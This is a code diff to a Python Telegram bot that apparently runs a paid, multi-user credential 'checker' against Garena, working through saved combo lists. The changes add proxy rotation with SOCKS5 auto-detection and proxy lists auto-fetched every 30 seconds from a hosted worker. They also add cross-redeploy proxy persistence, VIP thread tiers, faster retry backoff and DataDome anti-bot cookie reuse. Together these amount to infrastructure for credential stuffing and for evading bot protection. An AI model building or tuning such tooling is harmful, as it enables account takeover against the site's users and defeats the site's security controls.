@@ -16,7 +16,7 @@ from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from threading import Lock, Event
 from Crypto.Cipher import AES
-from numpy import rint
+# numpy removed — was unused and caused OOM on Railway (numpy ~50MB RAM)
 import requests
 import cloudscraper
 import colorama
@@ -54,6 +54,23 @@ CY  = Fore.CYAN
 
 # Global shutdown event for Ctrl+C handling
 shutdown_event = Event()
+_shutting_down = False  # Set to True when bot is intentionally shutting down
+
+
+# ── Liveness tracking — updated by key operations, checked by watchdog ──
+_liveness_ts = time.time()           # last time the bot did something useful
+_liveness_lock = threading.Lock()
+
+def _touch_liveness():
+    """Call this from key operations to prove the bot is alive."""
+    global _liveness_ts
+    with _liveness_lock:
+        _liveness_ts = time.time()
+
+def _get_liveness_age():
+    """Return seconds since last liveness touch."""
+    with _liveness_lock:
+        return time.time() - _liveness_ts
 
 # ── Thread exception hook — prevents silent thread crashes ──────
 def _thread_exception_hook(args):
@@ -70,6 +87,7 @@ _stop_events_lock = threading.Lock()
 
 # Per-owner proxy accumulator — collects lines across multiple messages
 _proxy_accumulator: dict = {}   # chat_id -> [raw_line, ...]
+_broadcast_accumulator: dict = {}  # chat_id -> [text_line, ...]
 
 # Per-owner proxy message tracker — message IDs to delete on Done
 _proxy_msg_ids: dict = {}       # chat_id -> [msg_id, ...]
@@ -78,31 +96,28 @@ _proxy_msg_ids: dict = {}       # chat_id -> [msg_id, ...]
 _deletekey_selection: dict = {}  # chat_id -> set of key strings
 
 # ══════════════════════════════════════════════════════════════
-#  GLOBAL RESOURCE CONTROLS
-#  Tuned for: 8GB RAM VPS, 83% RAM at idle (~1.35GB free)
+#  GLOBAL RESOURCE CONTROLS  — tuned for Railway
 #
-#  RAM math per checker thread:
-#    • cloudscraper session  ~12MB
-#    • requests + TLS stack   ~8MB
-#    • Python overhead        ~5MB
-#    • ≈ 25MB per thread (safe estimate)
+#  RAM per thread (lean sessions: pool_connections=3, pool_maxsize=5):
+#    • cloudscraper session  ~5MB
+#    • requests + TLS stack  ~3MB
+#    • Python overhead       ~2MB
+#    • ≈ 10MB per thread
 #
-#  Free RAM:  ~1350MB
-#  Reserve for OS + bot overhead: 400MB
-#  Usable for threads: ~950MB
-#  Max safe threads: 950 / 25 ≈ 38 → cap at 4 (conservative, stable)
-#
-#  CPU is only 21.8% so CPU is NOT the bottleneck — RAM is.
+#  50 threads × 10MB = ~500MB  →  safe on Railway's 512MB–8GB plans
+#  Memory watchdog auto-throttles if RAM spikes.
 # ══════════════════════════════════════════════════════════════
 
 # Hard cap on total checker threads across ALL users at once
-MAX_GLOBAL_THREADS   = 20     # increased for Railway — handles more concurrent work
-# Threads per individual user (limits one user hogging everything)
-MAX_THREADS_PER_USER = 5      # 5 threads per user — fast & stable
+MAX_GLOBAL_THREADS   = 50     # Railway can handle 50 with lean sessions (~10MB each)
+# Threads per individual Free user (limits one user hogging everything)
+FREE_THREADS_PER_USER = 2     # Free key users: 2 threads — queued, waits for slot
 # Max users running the checker simultaneously
 MAX_CONCURRENT_USERS = 10     # 10 users supported concurrently
-# VIP users get higher thread count for faster checking
-VIP_THREADS_PER_USER = 5      # VIP users: 5 threads (same cap, priority scheduling)
+# VIP users get higher thread count for faster checking — NO QUEUE
+VIP_THREADS_PER_USER = 10     # VIP users: 10 threads — instant, no queuing
+# Legacy alias — kept for backward compat in some messages
+MAX_THREADS_PER_USER = FREE_THREADS_PER_USER
 
 # Global semaphore — enforces MAX_GLOBAL_THREADS hard cap
 _global_thread_sem = threading.Semaphore(MAX_GLOBAL_THREADS)
@@ -111,6 +126,8 @@ _global_thread_sem = threading.Semaphore(MAX_GLOBAL_THREADS)
 #  GEO PROXY CONFIG  (auto-reads all .txt files from proxy/ folder, loops)
 # ══════════════════════════════════════════════════════════════
 PROXY_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxy")
+SAVED_COMBOS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "saved_combos")
+SAVED_PROXIES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "saved_proxies")
 
 def _init_proxy_folder():
     """Create proxy/ folder + a sample proxies.txt if folder didn't exist."""
@@ -120,14 +137,185 @@ def _init_proxy_folder():
         with open(sample, "w", encoding="utf-8") as f:
             f.write("# Add your proxies here (one per line)\n")
             f.write("# Supported formats:\n")
-            f.write("#   ip:port\n")
+            f.write("#   ip:port                          (auto-detect: SOCKS5 if port is 1080/1081/4145/9050)\n")
             f.write("#   user:pass@ip:port\n")
             f.write("#   http://ip:port\n")
             f.write("#   http://user:pass@ip:port\n")
+            f.write("#   https://ip:port\n")
+            f.write("#   socks5://ip:port                 (recommended for HTTPS sites like Garena)\n")
+            f.write("#   socks5://user:pass@ip:port\n")
             f.write("#   ip:port:user:pass\n")
+            f.write("#\n")
+            f.write("# SOCKS5 proxies are auto-detected by port number and work best for Garena.\n")
+            f.write("# Free proxies are auto-fetched from multiple sources.\n")
         print(f"\033[92m📁 proxy/ folder created — add your proxy .txt files inside it\033[0m")
 
 _init_proxy_folder()
+
+
+# ═══════════════════════════════════════════════════════════════════
+#  PERSISTENT PROXY STORAGE — survives Railway redeploys
+#  proxy/        → ephemeral (used by GeoRotator, may be cleaned)
+#  saved_proxies/→ persistent (never cleaned, backed up to KeyVault API)
+# ═══════════════════════════════════════════════════════════════════
+
+def _sync_proxies_to_saved():
+    """Copy all proxy/*.txt files to saved_proxies/ for persistence across restarts.
+    Called after any proxy change (upload, paste, fetch) to keep the backup current."""
+    import shutil
+    try:
+        os.makedirs(SAVED_PROXIES_DIR, exist_ok=True)
+        if not os.path.exists(PROXY_FOLDER):
+            return
+        for fname in os.listdir(PROXY_FOLDER):
+            if not fname.endswith(".txt"):
+                continue
+            src = os.path.join(PROXY_FOLDER, fname)
+            dst = os.path.join(SAVED_PROXIES_DIR, fname)
+            if not os.path.isfile(src):
+                continue
+            try:
+                shutil.copy2(src, dst)
+            except Exception as e:
+                logger.debug(f"[PROXY-PERSIST] Failed to sync {fname}: {e}")
+        logger.debug(f"[PROXY-PERSIST] Synced proxy files to saved_proxies/")
+    except Exception as e:
+        logger.debug(f"[PROXY-PERSIST] Sync failed: {e}")
+
+
+def _restore_proxies_from_saved():
+    """Restore proxy files from saved_proxies/ to proxy/ on startup.
+    Called before GeoRotator init so the proxy pool is populated from persistent storage.
+    Skips files that already exist in proxy/ (doesn't overwrite newer uploads)."""
+    import shutil
+    try:
+        if not os.path.exists(SAVED_PROXIES_DIR):
+            return 0
+        os.makedirs(PROXY_FOLDER, exist_ok=True)
+        restored = 0
+        for fname in os.listdir(SAVED_PROXIES_DIR):
+            if not fname.endswith(".txt"):
+                continue
+            src = os.path.join(SAVED_PROXIES_DIR, fname)
+            dst = os.path.join(PROXY_FOLDER, fname)
+            if not os.path.isfile(src):
+                continue
+            if os.path.exists(dst):
+                # Only overwrite if saved version is newer or proxy/ version is empty
+                try:
+                    src_size = os.path.getsize(src)
+                    dst_size = os.path.getsize(dst)
+                    if dst_size > 0 and dst_size >= src_size:
+                        continue  # keep existing (likely same or newer)
+                except Exception:
+                    continue
+            try:
+                shutil.copy2(src, dst)
+                restored += 1
+                logger.info(f"[PROXY-PERSIST] Restored {fname} from saved_proxies/")
+            except Exception as e:
+                logger.debug(f"[PROXY-PERSIST] Failed to restore {fname}: {e}")
+        if restored > 0:
+            logger.info(f"[PROXY-PERSIST] Restored {restored} proxy file(s) from saved_proxies/")
+        return restored
+    except Exception as e:
+        logger.debug(f"[PROXY-PERSIST] Restore failed: {e}")
+        return 0
+
+
+def _sync_proxies_to_keyvault():
+    """Save all proxy file contents to KeyVault API for persistence across Railway redeploys.
+    Each file is stored as a separate key: proxy_file_<filename>."""
+    try:
+        api = _get_keysystem_api()
+        if not api.enabled:
+            return
+        # Save a manifest of all proxy filenames
+        files = _get_proxy_files()
+        manifest = []
+        for fpath in files:
+            fname = os.path.basename(fpath)
+            try:
+                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
+                    file_content = f.read()
+                key = f"proxy_file_{fname}"
+                api.save_state(key, {"content": file_content, "filename": fname})
+                manifest.append(fname)
+            except Exception as e:
+                logger.debug(f"[PROXY-PERSIST] KeyVault sync failed for {fname}: {e}")
+        # Save manifest
+        api.save_state("proxy_manifest", {"files": manifest})
+        logger.debug(f"[PROXY-PERSIST] Synced {len(manifest)} proxy file(s) to KeyVault API")
+    except Exception as e:
+        logger.debug(f"[PROXY-PERSIST] KeyVault sync failed: {e}")
+
+
+def _restore_proxies_from_keyvault():
+    """Load proxy file contents from KeyVault API and write to proxy/ folder.
+    Called on startup after _restore_proxies_from_saved() as a fallback."""
+    try:
+        api = _get_keysystem_api()
+        if not api.enabled:
+            return 0
+        # Load manifest
+        manifest_data = api.load_state("proxy_manifest")
+        if not manifest_data or not isinstance(manifest_data, dict):
+            return 0
+        manifest = manifest_data.get("files", [])
+        if not manifest:
+            return 0
+        os.makedirs(PROXY_FOLDER, exist_ok=True)
+        restored = 0
+        for fname in manifest:
+            key = f"proxy_file_{fname}"
+            try:
+                data = api.load_state(key)
+                if not data or not isinstance(data, dict):
+                    continue
+                content = data.get("content", "")
+                if not content or not content.strip():
+                    continue
+                dst = os.path.join(PROXY_FOLDER, fname)
+                # Don't overwrite if file already exists with content
+                if os.path.exists(dst):
+                    try:
+                        with open(dst, "r", encoding="utf-8", errors="ignore") as f:
+                            existing = f.read()
+                        if existing.strip():
+                            continue  # keep local version
+                    except Exception:
+                        pass
+                with open(dst, "w", encoding="utf-8") as f:
+                    f.write(content)
+                restored += 1
+                logger.info(f"[PROXY-PERSIST] Restored {fname} from KeyVault API")
+            except Exception as e:
+                logger.debug(f"[PROXY-PERSIST] KeyVault restore failed for {fname}: {e}")
+        if restored > 0:
+            logger.info(f"[PROXY-PERSIST] Restored {restored} proxy file(s) from KeyVault API")
+        return restored
+    except Exception as e:
+        logger.debug(f"[PROXY-PERSIST] KeyVault restore failed: {e}")
+        return 0
+
+
+def _persist_proxies():
+    """Sync proxy files to both saved_proxies/ and KeyVault API.
+    Call this after any proxy change (upload, paste, fetch)."""
+    _sync_proxies_to_saved()
+    _sync_proxies_to_keyvault()
+
+
+def _restore_all_proxies():
+    """Restore proxy files from all persistent sources (saved_proxies/ + KeyVault API).
+    Called once at startup before GeoRotator init."""
+    restored_local = _restore_proxies_from_saved()
+    restored_api = _restore_proxies_from_keyvault()
+    total = restored_local + restored_api
+    if total > 0:
+        logger.info(f"[PROXY-PERSIST] ✅ Total {total} proxy file(s) restored from persistent storage")
+    return total
+
 
 def _get_proxy_files():
     """
@@ -159,8 +347,8 @@ def _get_proxy_files():
 
 PROXY_FILES = _get_proxy_files()
 
-def backoff(attempt: int, base: float = 0.03, cap: float = 0.2) -> None:
-    """Ultra-fast exponential backoff: 0.03s → 0.06s → 0.12s → 0.2s (capped)."""
+def backoff(attempt: int, base: float = 0.02, cap: float = 0.15) -> None:
+    """Ultra-fast exponential backoff: 0.02s → 0.04s → 0.08s → 0.15s (capped)."""
     delay = min(base * (2 ** attempt), cap)
     time.sleep(delay)
 
@@ -187,6 +375,9 @@ class GeoRotator:
         self._load_all_files()
         self._current_proxy = self._proxies[0] if self._proxies else None
 
+    # ── Known SOCKS5 ports — auto-detect SOCKS5 even without scheme ──
+    _SOCKS5_PORTS = {1080, 1081, 4145, 4146, 9050, 9051, 9052, 9053, 10800, 10801, 28100}
+
     def _normalize_proxy(self, line):
         """
         Normalize a proxy line into a valid URL string.
@@ -194,51 +385,73 @@ class GeoRotator:
         Supported input formats:
           1. http://host:port
           2. https://host:port
-          3. http://user:pass@host:port
-          4. https://user:pass@host:port
-          5. host:port                          → http://host:port
-          6. user:pass@host:port                → http://user:pass@host:port
-          7. ip:port:username:password          → http://username:password@ip:port
-          8. ip:port:username:password (https)  → detected if scheme prefix present
+          3. socks5://host:port / socks5h://host:port
+          4. http://user:pass@host:port
+          5. https://user:pass@host:port
+          6. socks5://user:pass@host:port
+          7. host:port                          → auto-detect: SOCKS5 if known port, else http
+          8. user:pass@host:port                → http://user:pass@host:port
+          9. ip:port:username:password          → http://username:password@ip:port
+         10. ip:port:username:password (https)  → detected if scheme prefix present
 
         Returns a normalized URL string, or None if the line is invalid.
         """
         original = line
+        line = line.strip()
+        if not line or line.startswith("#"):
+            return None
 
         # ── Step 1: Detect and strip explicit scheme ──────────────────────────
-        scheme = "http"
-        if line.lower().startswith("https://"):
+        scheme = "http"  # default
+        if line.lower().startswith("socks5h://"):
+            scheme = "socks5h"
+            line = line[10:]
+        elif line.lower().startswith("socks5://"):
+            scheme = "socks5h"  # use socks5h for remote DNS resolution
+            line = line[8:]
+        elif line.lower().startswith("socks4://"):
+            scheme = "socks5h"  # upgrade socks4 to socks5h
+            line = line[8:]
+        elif line.lower().startswith("https://"):
             scheme = "https"
             line = line[8:]
         elif line.lower().startswith("http://"):
             scheme = "http"
             line = line[7:]
 
-        # ── Step 2: Detect user:pass@host:port (already has @) ───────────────
+        # ── Step 2: Detect user:pass@host:port (already has @) ──
         if "@" in line:
             # Format: user:pass@host:port  — rebuild cleanly
             creds, _, hostport = line.partition("@")
             parts = hostport.rsplit(":", 1)
             if len(parts) == 2 and parts[1].isdigit():
+                # Auto-detect SOCKS5 by port even with auth
+                if scheme == "http" and int(parts[1]) in self._SOCKS5_PORTS:
+                    scheme = "socks5h"
                 return f"{scheme}://{creds}@{hostport}"
             logging.getLogger(__name__).warning(
                 f"[GEO] ⚠️  Skipping malformed proxy (bad host:port after @): {original}"
             )
             return None
 
-        # ── Step 3: Split by ':' to detect format ────────────────────────────
+        # ── Step 3: Split by ':' to detect format ──────────────────────────
         parts = line.split(":")
 
         if len(parts) == 2:
             # Format: host:port
             host, port_str = parts
             if host and port_str.isdigit():
+                # Auto-detect SOCKS5 by well-known ports
+                if scheme == "http" and int(port_str) in self._SOCKS5_PORTS:
+                    scheme = "socks5h"
                 return f"{scheme}://{host}:{port_str}"
 
         elif len(parts) == 4:
             # Format: ip:port:username:password
             ip, port_str, username, password = parts
             if ip and port_str.isdigit():
+                if scheme == "http" and int(port_str) in self._SOCKS5_PORTS:
+                    scheme = "socks5h"
                 return f"{scheme}://{username}:{password}@{ip}:{port_str}"
 
         elif len(parts) == 3:
@@ -246,6 +459,8 @@ class GeoRotator:
             # Try host:port (ignore third segment with a warning)
             host, port_str, extra = parts
             if host and port_str.isdigit():
+                if scheme == "http" and int(port_str) in self._SOCKS5_PORTS:
+                    scheme = "socks5h"
                 logging.getLogger(__name__).warning(
                     f"[GEO] ⚠️  Proxy has 3 colon-parts, treating as host:port (ignoring '{extra}'): {original}"
                 )
@@ -286,6 +501,12 @@ class GeoRotator:
             log.warning("[GEO] ⚠️  No proxy .txt files found in proxy/ folder — running without proxy!")
             self._proxies = []
             self._proxy_source = {}
+            # ── Notify owner about no proxies ──────────────────
+            try:
+                if OWNER_ID and BOT_TOKEN:
+                    _notify_no_proxy(BOT_TOKEN)
+            except Exception:
+                pass
             return False
 
         seen = set()
@@ -317,6 +538,12 @@ class GeoRotator:
             log.warning("[GEO] ⚠️  All proxy files empty or invalid — running without proxy!")
             self._proxies = []
             self._proxy_source = {}
+            # ── Notify owner about empty proxy pool ──────────────────
+            try:
+                if OWNER_ID and BOT_TOKEN:
+                    _notify_no_proxy(BOT_TOKEN)
+            except Exception:
+                pass
             return False
 
         random.shuffle(merged)
@@ -325,6 +552,11 @@ class GeoRotator:
         self._thread_idx = {}
 
         log.info(f"[GEO] ✅ Proxy pool ready: {len(merged)} unique proxies across {len(PROXY_FILES)} file(s)")
+        # ── Clear no-proxy warning since pool is loaded ────────
+        try:
+            _clear_no_proxy_warning()
+        except Exception:
+            pass
         return True
 
     def _load_next_file(self):
@@ -492,20 +724,342 @@ class GeoRotator:
         return len(self._proxies)
 
 # Singleton — created once, shared everywhere
-geo_rotator = GeoRotator()
+# Wrapped in try/except so Railway deployment doesn't crash if proxy folder is empty
+# ── Restore proxy files from persistent storage before initializing GeoRotator ──
+try:
+    _restore_all_proxies()
+except Exception as _restore_err:
+    logging.getLogger(__name__).warning(f"[PROXY-PERSIST] Restore failed: {_restore_err}")
+try:
+    geo_rotator = GeoRotator()
+except Exception as _geo_err:
+    logging.getLogger(__name__).warning(f"[GEO] ⚠️  GeoRotator init failed: {_geo_err} — running without proxy rotation")
+    # Create a dummy rotator that does nothing
+    class _DummyRotator:
+        """Fallback rotator that actually loads proxy files when GeoRotator fails."""
+        def __init__(self):
+            self._proxies = []
+            self._proxy_source = {}
+            self._thread_idx = {}
+            self._thread_proxy = {}
+            self._global_idx = 0
+            self.current_proxy = None
+            self._lock = threading.Lock()
+            self._load_all_files()
+        @property
+        def total(self):
+            return len(self._proxies)
+        def get_proxies(self): return {}
+        def force_rotate(self): return None
+        def smart_rotate(self): return None
+        def remove_blocked_proxy(self, *a, **kw): pass
+        def _advance_thread(self): return None
+        def _get_thread_idx(self): return 0
+        def _normalize_proxy(self, line):
+            """Basic normalizer with socks5h support for when GeoRotator is unavailable."""
+            line = line.strip()
+            if not line or line.startswith("#"):
+                return None
+            low = line.lower()
+            if low.startswith("socks5h://"):
+                return line
+            if low.startswith("socks5://"):
+                return "socks5h://" + line[8:]
+            if low.startswith("socks4://"):
+                return "socks5h://" + line[8:]
+            if low.startswith(("http://", "https://")):
+                return line
+            parts = line.split(":")
+            if len(parts) == 2 and parts[1].isdigit():
+                return f"http://{parts[0]}:{parts[1]}"
+            if len(parts) == 4 and parts[1].isdigit():
+                return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+            return None
+        def _load_all_files(self):
+            """Actually load proxy files — not a no-op anymore."""
+            try:
+                proxy_files = _get_proxy_files()
+                if not proxy_files:
+                    return False
+                seen = set()
+                merged = []
+                source_map = {}
+                for filepath in proxy_files:
+                    try:
+                        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+                            for line in f:
+                                line = line.strip()
+                                if not line or line.startswith("#"):
+                                    continue
+                                normalized = self._normalize_proxy(line)
+                                if normalized and normalized not in seen:
+                                    seen.add(normalized)
+                                    merged.append(normalized)
+                                    source_map[normalized] = filepath
+                    except Exception:
+                        continue
+                if merged:
+                    import random
+                    random.shuffle(merged)
+                    self._proxies = merged
+                    self._proxy_source = source_map
+                    self._thread_idx = {}
+                    self.current_proxy = merged[0] if merged else None
+                    # Clear any stale "no proxy" warning
+                    try:
+                        _clear_no_proxy_warning()
+                    except Exception:
+                        pass
+                    return True
+            except Exception:
+                pass
+            return False
+    geo_rotator = _DummyRotator()
 
-def signal_handler(signum, frame):
-    """Handle SIGINT (Ctrl+C) and SIGTERM (process manager shutdown) gracefully."""
-    sig_name = "SIGTERM" if signum == signal.SIGTERM else "SIGINT"
-    shutdown_event.set()   # signal all polling loops and checkers to stop
-    print(f"\n  ⚠️  {sig_name} received — shutting down gracefully...")
-    # Give threads up to 3 seconds to finish current work
-    time.sleep(1)
-    os._exit(0)
+# ══════════════════════════════════════════════════════════════
+#  RAW PROXY AUTO-FETCH
+#  Periodically fetches proxies from external URL sources,
+#  deduplicates against the current pool, and saves new ones.
+# ══════════════════════════════════════════════════════════════
+RAW_PROXY_SOURCES = [
+    # ── (url, default_scheme) ── scheme is used for bare ip:port lines from that source
+    # ── Primary source (custom worker) ── ONLY source used for auto-fetch
+    # ── Uses ?format=json so we get proxy type info (http/socks4/socks5)
+    ("https://worker-production-a615.up.railway.app/?format=json", "http"),
+]
+RAW_PROXY_FETCH_INTERVAL = 30  # 30 seconds — faster refresh for better proxy availability
+RAW_PROXY_SAVE_FILE = os.path.join(PROXY_FOLDER, "raw_fetched_proxies.txt")
 
-# Register both SIGINT (Ctrl+C) and SIGTERM (Wispbyte/systemd kill)
-signal.signal(signal.SIGINT,  signal_handler)
-signal.signal(signal.SIGTERM, signal_handler) 
+
+
+
+def _fetch_raw_proxies():
+    """
+    Background worker: fetches raw proxy lists from configured URLs every 30 seconds.
+    All fetched proxies are saved directly — the checker naturally removes dead ones.
+    Uses the correct scheme (http/socks5h) per source so SOCKS5 proxies
+    are stored with the right protocol instead of all as http://.
+    Wrapped in try/except so the thread never dies silently.
+    """
+    log = logging.getLogger(__name__)
+    log.info(f"[RAW-PROXY] Auto-fetch thread started — {len(RAW_PROXY_SOURCES)} source(s), "
+             f"interval {RAW_PROXY_FETCH_INTERVAL}s, save file: {RAW_PROXY_SAVE_FILE}")
+
+    # Ensure proxy folder and save file exist before we start
+    try:
+        os.makedirs(PROXY_FOLDER, exist_ok=True)
+        # Touch the save file so _get_proxy_files() can find it
+        if not os.path.exists(RAW_PROXY_SAVE_FILE):
+            with open(RAW_PROXY_SAVE_FILE, "w", encoding="utf-8") as f:
+                f.write("# Auto-fetched proxies — do not edit manually\n")
+            log.info(f"[RAW-PROXY] Created {RAW_PROXY_SAVE_FILE}")
+    except Exception as e:
+        log.error(f"[RAW-PROXY] Failed to create proxy folder/file: {e}")
+
+    def _normalize_with_scheme(line, default_scheme="http"):
+        """Normalize a proxy line using the correct scheme for its source."""
+        line = line.strip()
+        if not line or line.startswith("#"):
+            return None
+        # Already has a scheme? Use it as-is (upgrade socks5:// → socks5h:// for remote DNS)
+        low = line.lower()
+        if low.startswith("socks5h://"):
+            return line
+        if low.startswith("socks5://"):
+            return "socks5h://" + line[8:]  # upgrade to socks5h for remote DNS resolution
+        if low.startswith("socks4://"):
+            return "socks5h://" + line[8:]  # upgrade socks4 to socks5h
+        if low.startswith(("http://", "https://")):
+            return line
+        # Bare ip:port or ip:port:user:pass → apply the source's default scheme
+        parts = line.split(":")
+        if default_scheme == "socks5":
+            scheme_str = "socks5h"  # always use socks5h for SOCKS5 sources (remote DNS)
+        else:
+            scheme_str = default_scheme
+        if len(parts) == 2 and parts[1].isdigit():
+            return f"{scheme_str}://{parts[0]}:{parts[1]}"
+        if len(parts) == 4 and parts[1].isdigit():
+            return f"{scheme_str}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+        return None
+
+    while not shutdown_event.is_set():
+        # Touch liveness at the start of every fetch cycle so the watchdog
+        # knows the proxy fetcher thread is alive even if no new proxies found
+        _touch_liveness()
+        try:
+            total_new = 0
+            total_fetched = 0
+            total_dupes = 0
+
+            # ── Collect ALL proxies from ALL sources first, then write once ──
+            # This replaces the old append-only approach that kept stale proxies forever.
+            # Each cycle does a full rewrite so dead proxies are removed automatically.
+            all_normalized = []   # ordered list of unique normalized proxies
+            seen = set()
+
+            for source_entry in RAW_PROXY_SOURCES:
+                # Support both (url, scheme) tuples and plain url strings
+                if isinstance(source_entry, tuple):
+                    url, scheme = source_entry[0], source_entry[1]
+                else:
+                    url, scheme = source_entry, "http"
+
+                try:
+                    resp = requests.get(url, timeout=30)
+                    resp.raise_for_status()
+                except Exception as e:
+                    log.debug(f"[RAW-PROXY] Failed to fetch {url}: {e}")
+                    continue
+
+                # ── Try JSON format first (worker returns type info per proxy) ──
+                try:
+                    data = resp.json()
+                    proxy_items = data.get("proxies", [])
+                    if isinstance(proxy_items, list) and len(proxy_items) > 0 and isinstance(proxy_items[0], dict):
+                        # JSON format with type info — use it to apply correct scheme
+                        for item in proxy_items:
+                            raw_proxy = item.get("proxy", "").strip()
+                            proxy_type = item.get("type", "").lower().strip()
+                            if not raw_proxy or not proxy_type:
+                                continue
+                            total_fetched += 1
+                            # Determine scheme from the type field
+                            if proxy_type in ("socks5", "socks5h"):
+                                line_scheme = "socks5h"
+                            elif proxy_type == "socks4":
+                                line_scheme = "socks5h"
+                            else:
+                                line_scheme = "http"
+                            try:
+                                normalized = _normalize_with_scheme(raw_proxy, line_scheme)
+                            except Exception:
+                                continue
+                            if not normalized:
+                                continue
+                            if normalized in seen:
+                                total_dupes += 1
+                                continue
+                            seen.add(normalized)
+                            all_normalized.append(normalized)
+                            total_new += 1
+                        continue  # skip the plain-text parsing below
+                except (ValueError, KeyError, TypeError):
+                    pass  # Not JSON or malformed — fall through to plain-text parsing
+
+                # ── Fallback: plain-text parsing (bare ip:port lines) ──
+                lines = [l.strip() for l in resp.text.splitlines()
+                         if l.strip() and not l.strip().startswith("#")]
+                total_fetched += len(lines)
+
+                source_new = 0
+                dupes = 0
+                for raw_line in lines:
+                    try:
+                        normalized = _normalize_with_scheme(raw_line, scheme)
+                    except Exception:
+                        continue
+                    if not normalized:
+                        continue
+                    if normalized in seen:
+                        dupes += 1
+                        continue
+                    seen.add(normalized)
+                    all_normalized.append(normalized)
+                    source_new += 1
+
+                total_dupes += dupes
+                total_new += source_new
+
+            # ── Merge new proxies with existing ones in the save file ──
+            # Reads existing proxies from the file, merges with freshly fetched ones,
+            # then writes the combined set back. This prevents losing proxies when the
+            # API returns a partial/empty response, while still allowing dead proxies
+            # (removed by remove_blocked_proxy) to stay gone.
+            if all_normalized or os.path.exists(RAW_PROXY_SAVE_FILE):
+                try:
+                    os.makedirs(PROXY_FOLDER, exist_ok=True)
+                    # Load existing proxies from the save file
+                    existing_proxies = set()
+                    existing_order = []  # preserve insertion order
+                    if os.path.exists(RAW_PROXY_SAVE_FILE):
+                        try:
+                            with open(RAW_PROXY_SAVE_FILE, "r", encoding="utf-8", errors="ignore") as f:
+                                for line in f:
+                                    line = line.strip()
+                                    if line and not line.startswith("#"):
+                                        existing_proxies.add(line)
+                                        existing_order.append(line)
+                        except OSError:
+                            pass
+
+                    # Merge: new proxies are added; existing ones are kept
+                    merged = list(existing_order)  # start with existing
+                    new_added = 0
+                    for p in all_normalized:
+                        if p not in existing_proxies:
+                            existing_proxies.add(p)
+                            merged.append(p)
+                            new_added += 1
+
+                    # Write the merged set back
+                    with open(RAW_PROXY_SAVE_FILE, "w", encoding="utf-8") as f:
+                        f.write("# Auto-fetched proxies — do not edit manually\n")
+                        for p in merged:
+                            f.write(p + "\n")
+                    log.info(f"[RAW-PROXY] Merged: {len(merged)} total proxies in {RAW_PROXY_SAVE_FILE} (+{new_added} new)")
+                except OSError as e:
+                    log.error(f"[RAW-PROXY] Failed to write {RAW_PROXY_SAVE_FILE}: {e}")
+
+            if total_new > 0:
+                try:
+                    with geo_rotator._lock:
+                        geo_rotator._load_all_files()
+                    _touch_liveness()  # proxy fetch is alive
+                    pool_now = geo_rotator.total
+                    if pool_now > 0:
+                        log.info(f"[RAW-PROXY] Pool reloaded successfully: {pool_now} proxies")
+                    else:
+                        log.warning(f"[RAW-PROXY] Pool still 0 after reload — checking save file...")
+                        if os.path.exists(RAW_PROXY_SAVE_FILE):
+                            with open(RAW_PROXY_SAVE_FILE, "r", encoding="utf-8", errors="ignore") as f:
+                                file_lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+                            log.warning(f"[RAW-PROXY] Save file has {len(file_lines)} lines, pool={pool_now}")
+                        else:
+                            log.error(f"[RAW-PROXY] Save file {RAW_PROXY_SAVE_FILE} does not exist!")
+                except Exception as e:
+                    log.error(f"[RAW-PROXY] Failed to reload proxy pool: {e}", exc_info=True)
+
+                # Auto-resume proxy-paused users if proxies are now available
+                try:
+                    if _proxy_paused_users:
+                        _resume_proxy_paused_users(BOT_TOKEN)
+                except Exception:
+                    pass
+
+                # Persist fetched proxies to saved_proxies/ + KeyVault API
+                try:
+                    _persist_proxies()
+                except Exception:
+                    pass
+
+                log.info(f"[RAW-PROXY] +{total_new} new proxies added "
+                         f"(fetched {total_fetched}, {total_dupes} dupes) | pool now: {geo_rotator.total}")
+            else:
+                log.debug(f"[RAW-PROXY] No new proxies this cycle "
+                          f"(fetched {total_fetched}, {total_dupes} dupes)")
+
+        except Exception as e:
+            log.error(f"[RAW-PROXY] Error in fetch cycle: {e}", exc_info=True)
+
+        # Wait for next cycle (interruptible by shutdown)
+        shutdown_event.wait(RAW_PROXY_FETCH_INTERVAL)
+
+# NOTE: Signal handlers are registered in main() via _graceful_shutdown().
+# Do NOT register signal handlers at module level — they conflict with the
+# ones in main() and cause SystemExit crashes that trigger Railway restart loops.
+# The old module-level signal_handler raised SystemExit(0) which killed the
+# process instantly instead of letting the main loop shut down gracefully. 
 
 class Colors:
     LIGHTGREEN_EX = colorama.Fore.LIGHTGREEN_EX
@@ -566,7 +1120,7 @@ class GracefulThreadPoolExecutor(ThreadPoolExecutor):
 
 class CookieManager:
     COOKIE_MAX_LINES = 1000   # auto-delete threshold
-    COOKIE_KEEP      = 1      # keep only 1 newest cookie after cleanup (delete 999)
+    COOKIE_KEEP      = 100    # keep 100 newest cookies after cleanup (delete 900)
 
     def __init__(self):
         self.banned_cookies = set()
@@ -597,7 +1151,7 @@ class CookieManager:
                 with open('fresh_cookie.txt', 'r') as f:
                     lines = [l.strip() for l in f if l.strip()]
                 if len(lines) >= self.COOKIE_MAX_LINES:
-                    keep = lines[-self.COOKIE_KEEP:]   # keep only the newest cookie(s)
+                    keep = lines[-self.COOKIE_KEEP:]   # keep the newest 100 cookies
                     deleted = len(lines) - len(keep)
                     with open('fresh_cookie.txt', 'w') as f:
                         f.write('\n'.join(keep) + '\n')
@@ -639,16 +1193,25 @@ class DataDomeManager:
         self.current_datadome = None
         self.datadome_history = []
         self._403_attempts = 0
+        self._cookie_timestamp = 0  # When the current cookie was obtained
+        self._cookie_max_age = 300   # Cookies expire after 5 minutes
         
     def set_datadome(self, datadome_cookie):
         if datadome_cookie and datadome_cookie != self.current_datadome:
             self.current_datadome = datadome_cookie
             self.datadome_history.append(datadome_cookie)
+            self._cookie_timestamp = time.time()
             if len(self.datadome_history) > 10:
                 self.datadome_history.pop(0)
             
     def get_datadome(self):
         return self.current_datadome
+    
+    def is_cookie_stale(self):
+        """Check if the current DataDome cookie might be expired."""
+        if not self.current_datadome:
+            return True
+        return (time.time() - self._cookie_timestamp) > self._cookie_max_age
         
     def extract_datadome_from_session(self, session):
         try:
